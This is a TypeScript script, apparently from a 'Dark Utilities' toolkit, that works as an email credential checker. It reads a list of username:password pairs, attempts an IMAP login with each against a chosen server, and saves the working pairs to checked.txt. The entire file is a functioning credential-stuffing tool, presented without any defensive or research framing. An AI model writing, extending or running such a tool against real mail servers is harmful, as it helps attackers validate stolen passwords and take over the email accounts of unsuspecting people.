import chalk from 'chalk';
import * as fs from 'fs';
import * as Imap from 'imap';
import * as path from 'path';

import Utils from './lib/utils';

console.log(chalk.red(`
  ╔╦╗╔═╗╦═╗╦╔═    ╦ ╦╔╦╗╦╦  ╦╔╦╗╦╔═╗╔═╗
   ║║╠═╣╠╦╝╠╩╗    ║ ║ ║ ║║  ║ ║ ║║╣ ╚═╗
  ═╩╝╩ ╩╩╚═╩ ╩    ╚═╝ ╩ ╩╩═╝╩ ╩ ╩╚═╝╚═╝
       The power on your side
`));

if (Utils.GetArgs().length < 3) {
    console.log(`${chalk.red("[ERROR]")} bad command usage

        ${chalk.yellow('Usage Sheme:')}
            - user@some_name:~# node ${path.basename(__filename)} <server> <port> <file>
    `);
    process.exit(0);
}

const args = Utils.GetArgs();
if (args.length < 3) {
    console.log(`${chalk.red("[ERROR]")} bad command usage

        ${chalk.yellow('Usage Sheme:')}
            - user@some_name:~# node ${path.basename(__filename)} <server> <port> <file>
    `);
    process.exit(0);
}

const server = args[0];
const port = parseInt(args[1]!, 10);
const file = args[2];

fs.readFile("./" + file, "utf8", (err: NodeJS.ErrnoException | null, data: string) => {
    if (err) {
        console.error(`${chalk.red("[ERROR]")} Could not read file: ${err.message}`);
        process.exit(1);
    }

    data.split("\r\n").forEach(item => {
        if (!item.trim()) return;

        const [user, password] = item.split(":") as [string, string];

        const imap = new Imap({
            user,
            password,
            host: server,
            port: port,
            tls: true
        });

        imap.once('ready', function () {
            console.log(chalk.hex('#d6af42')(Utils.formatConsoleDate(new Date())) + chalk.green(user + " Saved to checked.txt ."));
            fs.appendFile('./checked.txt', `${user}:${password} \r\n`, function (err) {
                if (err) return console.log(err);
            });

            imap.end();
        });

        imap.once('error', function (err: Error) {
            console.log(chalk.hex('#d6af42')(Utils.formatConsoleDate(new Date())) + chalk.red(user + " error while connecting."));
            imap.end();
        });

        imap.connect();
    });
});